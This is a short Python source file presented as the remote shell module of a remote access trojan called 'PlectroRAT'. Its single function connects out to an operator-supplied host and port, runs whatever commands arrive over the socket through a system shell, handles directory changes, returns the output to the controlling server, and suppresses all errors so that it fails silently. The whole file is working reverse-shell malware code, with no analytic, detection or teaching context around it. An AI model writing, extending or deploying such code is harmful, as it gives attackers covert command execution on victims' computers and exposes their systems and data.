

# Remote shell module for PlectroRAT
# Connects to a remote host and executes shell commands received over the socket

import socket
import subprocess
import os

def connect_and_listen(host, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))

        while True:
            # Receive the command from the server
            data = s.recv(1024)
            if not data:
                break
            cmd = data.decode("utf-8").strip()

            # Change directory if needed
            if cmd.startswith("cd "):
                path = cmd[3:].strip()
                try:
                    os.chdir(path)
                    output = f"Changed directory to {path}"
                except Exception as e:
                    output = f"cd failed: {str(e)}"
            else:
                # Run the command using subprocess
                try:
                    output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
                    output = output.decode("utf-8")
                except subprocess.CalledProcessError as e:
                    output = e.output.decode("utf-8")

            # Send the command output back to the server
            s.send(output.encode("utf-8"))
    except Exception as e:
        pass